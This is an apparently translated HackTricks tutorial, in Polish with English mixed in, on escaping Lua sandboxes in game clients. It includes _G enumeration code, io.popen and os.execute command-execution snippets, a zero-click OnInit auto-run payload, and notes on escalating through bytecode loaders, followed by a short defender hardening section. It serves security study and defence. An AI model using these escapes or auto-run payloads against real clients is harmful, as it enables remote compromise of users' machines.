# Omijanie sandboxów Lua (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ta strona zbiera praktyczne techniki do enumeracji i wydostania się z Lua "sandboxes" osadzonych w aplikacjach (w szczególności game clients, plugins lub in-app scripting engines). Wiele silników udostępnia ograniczone środowisko Lua, ale pozostawia potężne globals osiągalne, które umożliwiają dowolne wykonywanie poleceń lub nawet korupcję pamięci natywnej, gdy bytecode loaders są ujawnione.

Key ideas:
- Traktuj VM jako nieznane środowisko: enumeruj _G i odkryj, jakie niebezpieczne primitives są osiągalne.
- Gdy stdout/print jest zablokowany, wykorzystaj dowolny in-VM UI/IPC channel jako output sink, aby obserwować wyniki.
- Jeśli io/os jest udostępnione, często masz bezpośrednie wykonywanie poleceń (io.popen, os.execute).
- Jeśli load/loadstring/loadfile są dostępne, wykonanie spreparowanego Lua bytecode może naruszyć bezpieczeństwo pamięci w niektórych wersjach (≤5.1 verifiers są bypassable; 5.2 removed verifier), umożliwiając zaawansowaną exploitation.

## Enumerate the sandboxed environment

- Dump the global environment to inventory reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Jeśli print() nie jest dostępne, wykorzystaj kanały w VM. Przykład z VM skryptu housingowego MMO, gdzie wyjście czatu działa tylko po wywołaniu dźwięku; poniższe tworzy niezawodną funkcję wyjścia:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Uogólnij ten wzorzec dla swojego celu: dowolny textbox, toast, logger lub UI callback, który akceptuje strings, może działać jako stdout do rozpoznania.

## Bezpośrednie wykonywanie poleceń jeśli io/os są udostępnione

Jeśli sandbox nadal udostępnia standardowe biblioteki io lub os, prawdopodobnie masz natychmiastowe wykonywanie poleceń:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- Wykonanie odbywa się w procesie klienta; wiele warstw anti-cheat/antidebug, które blokują zewnętrzne debugery, nie powstrzyma tworzenia procesów in-VM.
- Sprawdź też: package.loadlib (dowolne ładowanie DLL/.so), require z native modules, LuaJIT's ffi (jeśli obecny) oraz debug library (może podnieść uprawnienia wewnątrz VM).

## Zero-click triggers via auto-run callbacks

Jeśli aplikacja hosta wypycha skrypty do klientów, a VM udostępnia auto-run hooks (np. OnInit/OnLoad/OnEnter), umieść tam swój payload, aby przeprowadzić drive-by compromise zaraz po załadowaniu skryptu:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Każdy równoważny callback (OnLoad, OnEnter, etc.) uogólnia tę technikę, gdy skrypty są przesyłane i wykonywane po stronie klienta automatycznie.

## Niebezpieczne prymitywy do wyszukania podczas recon

Podczas enumeracji _G, szukaj w szczególności:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: wykonuje źródło lub bytecode; pozwala na ładowanie niezaufanego bytecode.
- package, package.loadlib, require: ładowanie dynamicznych bibliotek i powierzchnia modułu.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load do wywoływania kodu natywnego bezpośrednio.

Minimalne przykłady użycia (jeśli osiągalne):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opcjonalna eskalacja: nadużywanie Lua bytecode loaders

Gdy load/loadstring/loadfile są osiągalne, ale io/os są ograniczone, wykonanie spreparowanego Lua bytecode może prowadzić do ujawnienia pamięci i prymitywów korupcji pamięci. Kluczowe fakty:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

Ta ścieżka jest specyficzna dla silnika/wersji i wymaga RE. Zobacz references dla dogłębnych analiz, exploitation primitives i przykładów gadgetry w grach.

## Detection and hardening notes (for defenders)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
